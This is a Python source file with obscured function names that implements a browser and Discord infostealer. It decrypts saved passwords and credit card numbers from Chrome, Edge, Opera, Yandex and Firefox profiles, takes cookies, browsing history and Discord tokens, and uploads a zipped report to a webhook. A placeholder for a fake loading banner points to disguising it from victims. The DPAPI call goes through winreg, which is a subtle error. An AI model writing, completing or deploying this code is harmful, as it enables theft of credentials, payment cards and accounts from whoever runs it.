import os, json, sqlite3, shutil, winreg, requests, base64, re, zipfile, tempfile
from datetime import datetime, timedelta
from Crypto.Cipher import AES
import browser_cookie3

k = "your_webhook_here"
b = r"""
user banner for fake loading here
"""

class X:
    def __init__(self):
        self.d = {}
        self.t = tempfile.mkdtemp()
    
    def gb(self):
        b = []
        a = os.getenv('LOCALAPPDATA')
        p = {
            'G': os.path.join(a, 'Google', 'Chrome', 'User Data'),
            'E': os.path.join(a, 'Microsoft', 'Edge', 'User Data'),
            'O': os.path.join(a, 'Opera Software', 'Opera Stable'),
            'Y': os.path.join(a, 'Yandex', 'YandexBrowser', 'User Data'),
        }
        for n, path in p.items():
            if os.path.exists(path): b.append((n, path))
        f = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
        if os.path.exists(f): b.append(('F', f))
        return b
    
    def mk(self, path):
        try:
            with open(os.path.join(path, "Local State"), 'r', encoding='utf-8') as f:
                k = base64.b64decode(json.loads(f.read())["os_crypt"]["encrypted_key"])[5:]
                return winreg.CryptUnprotectData(k, None, None, None, 0)[1]
        except: return None
    
    def dp(self, b, k):
        try:
            iv, p = b[3:15], b[15:]
            return AES.new(k, AES.MODE_GCM, iv).decrypt(p)[:-16].decode()
        except: return "Error"
    
    def gp(self, path, n):
        p = []
        db = os.path.join(path, 'Login Data')
        if not os.path.exists(db): return p
        shutil.copy2(db, os.path.join(self.t, 'ldb'))
        conn = sqlite3.connect(os.path.join(self.t, 'ldb'))
        c = conn.cursor()
        c.execute("SELECT origin_url, username_value, password_value FROM logins")
        k = self.mk(os.path.dirname(path))
        for u, n, pv in c.fetchall():
            if u and n and pv: p.append({'u': u, 'n': n, 'p': self.dp(pv, k) if k else "Fail"})
        c.close()
        return p
    
    def gfp(self, path):
        p = []
        for d in os.listdir(path):
            if d.endswith('.default-release'):
                jp = os.path.join(path, d, 'logins.json')
                if os.path.exists(jp):
                    try:
                        with open(jp, 'r') as f:
                            for l in json.load(f).get('logins', []):
                                p.append({'u': l.get('hostname',''), 'n': l.get('encryptedUsername',''), 'p': l.get('encryptedPassword','')})
                    except: pass
        return p
    
    def gc(self, n, path):
        c = []
        try:
            if n == 'F': bf = browser_cookie3.firefox
            else: bf = lambda: browser_cookie3.chrome(cookie_file=os.path.join(path, 'Cookies'))
            for cookie in bf():
                c.append({'n': cookie.name, 'v': cookie.value, 'd': cookie.domain})
        except: pass
        return c
    
    def gcc(self, path):
        cc = []
        db = os.path.join(path, 'Web Data')
        if not os.path.exists(db): return cc
        shutil.copy2(db, os.path.join(self.t, 'wdb'))
        conn = sqlite3.connect(os.path.join(self.t, 'wdb'))
        c = conn.cursor()
        c.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
        k = self.mk(os.path.dirname(path))
        for nm, em, ey, enc in c.fetchall():
            if nm and enc: cc.append({'nm': nm, 'num': self.dp(enc, k) if k else "Fail", 'exp': f"{em}/{ey}"})
        c.close()
        return cc
    
    def gh(self, path):
        h = []
        db = os.path.join(path, 'History')
        if not os.path.exists(db): return h
        shutil.copy2(db, os.path.join(self.t, 'hdb'))
        conn = sqlite3.connect(os.path.join(self.t, 'hdb'))
        c = conn.cursor()
        c.execute("SELECT url, title FROM urls")
        for u, t in c.fetchall():
            if u: h.append({'u': u, 't': t})
        c.close()
        return h
    
    def gdt(self):
        t = []
        ps = [os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb'),
              os.path.join(os.getenv('LOCALAPPDATA'), 'Discord', 'Local Storage', 'leveldb')]
        for p in ps:
            if os.path.exists(p):
                for f in os.listdir(p):
                    if f.endswith(('.log', '.ldb')):
                        try:
                            with open(os.path.join(p, f), 'r', errors='ignore') as fl:
                                for ln in fl:
                                    for tk in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}", ln):
                                        t.append(tk)
                        except: pass
        return t
    
    def cd(self):
        for bn, path in self.gb():
            self.d[bn] = {}
            if bn == 'F': self.d[bn]['p'] = self.gfp(path)
            else: self.d[bn]['p'] = self.gp(os.path.join(path, 'Default'), bn)
            self.d[bn]['c'] = self.gc(bn, os.path.join(path, 'Default'))
            self.d[bn]['cc'] = self.gcc(os.path.join(path, 'Default'))
            self.d[bn]['h'] = self.gh(os.path.join(path, 'Default'))
        self.d['D'] = self.gdt()
    
    def cr(self):
        r = f"# Report\n**Date:** {datetime.now()}\n**User:** {os.getlogin()}\n"
        for b, data in self.d.items():
            if b == 'D': continue
            r += f"## {b}\n"
            if data.get('p'):
                for i in data['p']: r += f"- **URL:** {i['u']}\n  **User:** {i['n']}\n  **Pass:** {i['p']}\n\n"
            if data.get('c'):
                for i, ck in enumerate(data['c'][:5], 1): r += f"{i}. {ck['n']}={ck['v'][:15]}... ({ck['d']})\n"
        if self.d.get('D'): r += "## Discord\n" + '\n'.join(f"- `{t}`" for t in self.d['D'])
        return r
    
    def sw(self):
        with open(os.path.join(self.t, 'r.txt'), 'w') as f: f.write(self.cr())
        zp = os.path.join(self.t, 'd.zip')
        with zipfile.ZipFile(zp, 'w') as zf:
            zf.write(os.path.join(self.t, 'r.txt'), 'r.txt')
        with open(zp, 'rb') as f:
            requests.post(k, files={'file': f})
    
    def cu(self):
        shutil.rmtree(self.t, ignore_errors=True)

if __name__ == "__main__":
    x = X()
    x.cd()
    x.sw()
    x.cu()
